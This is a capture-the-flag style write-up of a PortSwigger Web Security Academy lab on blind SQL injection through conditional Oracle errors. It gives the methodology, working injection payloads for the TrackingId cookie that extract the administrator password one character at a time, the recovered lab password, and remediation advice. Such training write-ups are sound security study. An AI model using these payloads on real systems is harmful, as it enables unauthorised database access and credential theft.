
# Blind SQL Injection with Conditional Errors

* **Platform:** PortSwigger Web Security Academy
* **Difficulty:** Practitioner
* **Category:** SQL Injection — Blind SQL Injection
* **Status:** Solved
* **Tool:** Burp Suite (Repeater & Intruder)

## Objective

Exploit a blind SQL injection vulnerability in the `TrackingId` cookie to extract the administrator's password using conditional database errors.

## Methodology

1. Intercepted the request using Burp Suite and identified the `TrackingId` cookie as the injection point.
2. Injected single and double quotation marks to identify SQL syntax errors.
3. Used Oracle-specific syntax (`dual`) to confirm the database type.
4. Confirmed the existence of the `users` table using a SQL subquery.
5. Used a `CASE WHEN` statement with a division-by-zero operation to trigger errors when specific conditions were TRUE.
6. Determined the administrator's password length by testing different lengths.
7. Used Burp Intruder to extract the password character by character with the `SUBSTR()` function.
8. Used HTTP 500 responses to identify successful character matches and reconstructed the password.
9. Logged in successfully as the administrator.

## Payloads

**Identify SQL syntax errors:**

```sql
'
```

**Confirm Oracle database syntax:**

```sql
'||(SELECT '' FROM dual)||'
```

**Confirm the users table exists:**

```sql
'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
```

**Trigger conditional errors:**

```sql
'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```

**Determine password length:**

```sql
'||(SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

**Extract password characters:**

```sql
'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```
```text
4ty7g5fzix6hit156dyl
```

## Vulnerability

The application incorporated the untrusted `TrackingId` cookie into an SQL query without adequate protection, allowing attackers to inject SQL statements and trigger conditional database errors.

## Impact

An attacker could extract sensitive database information, including administrator credentials, by observing differences in HTTP responses and identifying when database errors occur.

## Remediation

* Use parameterized queries (prepared statements).
* Never concatenate untrusted input into SQL statements.
* Validate and securely handle cookie values.
* Avoid exposing database errors to users.
* Apply least-privilege database permissions.

## Evidence

<img width="555" height="407" alt="image" src="https://github.com/user-attachments/assets/4b79b894-61e9-4f95-8c68-040946f5cea7" />
<img width="1437" height="787" alt="image" src="https://github.com/user-attachments/assets/c69e4450-e66b-4f06-b938-a2632d7c1786" />
<img width="1570" height="262" alt="image" src="https://github.com/user-attachments/assets/bb5b1629-c2de-4fe6-a4a5-4a718b79c4b5" />




